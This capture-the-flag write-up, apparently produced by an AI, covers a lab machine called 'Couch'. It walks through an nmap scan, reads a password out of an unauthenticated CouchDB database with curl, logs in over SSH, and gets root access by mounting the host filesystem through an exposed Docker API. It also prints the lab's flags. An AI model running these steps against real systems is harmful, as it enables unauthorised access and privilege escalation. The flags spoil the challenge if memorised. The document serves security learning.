# Couch CTF Writeup
(*solved by gemini 🤖🤖🤖*)
Target IP: 10.49.141.68

## 1. Enumeration

### Port Scanning
First, I conducted an Nmap scan to identify open ports and services.

```bash
nmap -sC -sV -p- --min-rate 5000 10.49.141.68
```

**Results:**
- **Port 22/tcp**: Open (OpenSSH 7.2p2 Ubuntu)
- **Port 5984/tcp**: Open (CouchDB httpd 1.6.1)

### CouchDB Enumeration
CouchDB 1.6.1 was found on port 5984. I checked the root endpoint and listed all databases.

```bash
# Check CouchDB version
curl -s http://10.49.141.68:5984/

# List all databases
curl -s http://10.49.141.68:5984/_all_dbs
```

**Output:**
```json
["_replicator","_users","couch","secret","test_suite_db","test_suite_db2"]
```

The database `secret` looked interesting.

## 2. Vulnerability Analysis

### Unauthenticated Access
CouchDB was configured with default settings allowing unauthenticated access to its databases.

### Sensitive Data Retrieval
I listed the documents in the `secret` database:

```bash
curl -s http://10.49.141.68:5984/secret/_all_docs
```

One document ID was found: `a1320dd69fb4570d0a3d26df4e000be7`. Retrieving its content:

```bash
curl -s http://10.49.141.68:5984/secret/a1320dd69fb4570d0a3d26df4e000be7
```

**Result:**
```json
{"_id":"a1320dd69fb4570d0a3d26df4e000be7","_rev":"2-57b28bd986d343cacd9cb3fca0b20c46","passwordbackup":"atena:t4qfzcc4qN##"}
```

I discovered credentials: `atena:t4qfzcc4qN##`.

## 3. Exploitation (User Access)

Using the discovered credentials, I logged into the machine via SSH.

```bash
ssh atena@10.49.141.68
# Password: t4qfzcc4qN##
```

Once logged in, I retrieved the user flag:

```bash
cat user.txt
```
**User Flag:** `THM{1ns3cure_couchdb}`

## 4. Privilege Escalation

### Post-Exploitation Enumeration
I checked the user's bash history to find potential clues for privilege escalation.

```bash
cat .bash_history
```

The history contained a very specific command:
`docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine`

I verified if anything was listening on port 2375:

```bash
netstat -antl | grep 2375
```
It was listening on `127.0.0.1:2375`.

### Exploiting Docker API
The Docker API was exposed locally without authentication. I used it to run a container, mounting the host's root directory to `/mnt` inside the container, allowing me to read any file on the host.

```bash
docker -H 127.0.0.1:2375 run --rm -v /:/mnt alpine cat /mnt/root/root.txt
```

**Root Flag:** `THM{RCE_us1ng_Docker_API}`

## 5. Summary of Flags
- **User Flag:** `THM{1ns3cure_couchdb}`
- **Root Flag:** `THM{RCE_us1ng_Docker_API}`
